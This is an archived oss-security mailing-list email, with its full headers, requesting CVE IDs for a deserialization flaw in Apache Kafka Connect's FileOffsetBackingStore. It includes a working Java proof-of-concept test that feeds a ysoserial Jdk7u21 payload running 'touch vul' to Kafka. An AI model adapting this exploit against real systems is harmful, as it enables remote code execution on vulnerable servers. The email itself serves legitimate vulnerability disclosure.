X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2350" "Wednesday" "19" "July" "2017" "09:41:16" "+1000" "Hooman Ghasem Broujerdi" "hghasemb@redhat.com" "<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>" "71" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" nil nil nil "7" "2017071823:41:16" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" (number mark "U       hghasemb@red Jul 19   71/2350  " thread-indent "\"[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30462 invoked by uid 550); 19 Jul 2017 00:51:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25607 invoked from network); 18 Jul 2017 23:41:28 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=1fXKTjDkvpM2vNNiS2dnvBdrz+dsIejEcGk2akTIuYI=;
        b=kEHLk9tFmf2O1fJYpYzB4KaUpabJx9BpmWI8x4UaKJeeI9XgkZ8w4CAPesJ01JZAeN
         4iE5TOEDL2NdBh5WswG7RFYJltDACu7EgPocCh8ubCPkD1sAEcVFur/QjGyl8Z4tK+sv
         gEjcvDwlSUG/gVlmrkGrwcGzOdpMqt5zHJFVVoxAqUrD25KEVA3uZ/qf3rNEUSPDvJft
         RF1XswYi3055ng8MKlAOxBB18lck13gV3ObNJUErPCPRjdIo/fLfSiUwRetE8ANhFStD
         sQSFiqAf8s3oA1jJ/Lyz6M90COqtSAr0hRx6YAsmqaX7WJm7aIi8nI9PlPasynWDE4Zi
         vrVA==
X-Gm-Message-State: AIVw112j1JzjVNOkUnssMkCJPUuMzW3SOqqr6rKTY+aYaVS8OV8/eWJU
	V+2iaGRXDDC5BEPx0q5VlouhQkbk1VgDI0o=
X-Received: by 10.55.8.139 with SMTP id 133mr153182qki.22.1500421276597; Tue,
 18 Jul 2017 16:41:16 -0700 (PDT)
MIME-Version: 1.0
From: Hooman Ghasem Broujerdi <hghasemb@redhat.com>
Date: Wed, 19 Jul 2017 09:41:16 +1000
Message-ID: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="001a114c55463497aa0554a00db6"
Subject: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime

--001a114c55463497aa0554a00db6
Content-Type: text/plain; charset="UTF-8"

Hi,

Apache kafka connect-api runtime contains a desrialization vul via
FileOffsetBackingStore
which leads to remote code execution, this can be exploited reliably in
JDK1.7.0_05, below is
a unit test for it:


import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;
import org.apache.commons.io.FileUtils;
import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
import org.apache.kafka.connect.storage.FileOffsetBackingStore;
import ysoserial.payloads.Jdk7u21;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public void test_Kafka_Deser() throws Exception {

        StandaloneConfig config;

        String projectDir = System.getProperty("user.dir");

        Jdk7u21 jdk7u21 = new Jdk7u21();
        Object o = jdk7u21.getObject("touch vul");

        byte[] ser = serialize(o);

        File tempFile = new File(projectDir + "/payload.ser");
        FileUtils.writeByteArrayToFile(tempFile, ser);

        Map<String, String> props = new HashMap<String, String>();
        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
tempFile.getAbsolutePath());
        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
"org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
"org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
"org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
"org.apache.kafka.connect.json.JsonConverter");
        config = new StandaloneConfig(props);

        FileOffsetBackingStore restore = new FileOffsetBackingStore();
        restore.configure(config);
        restore.start();
    }

    private byte[] serialize(Object object) throws IOException {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bout);
        out.writeObject(object);
        out.flush();
        return bout.toByteArray();
    }

Thanks,
Hooman Broujerdi / Red Hat Product Security

--001a114c55463497aa0554a00db6--
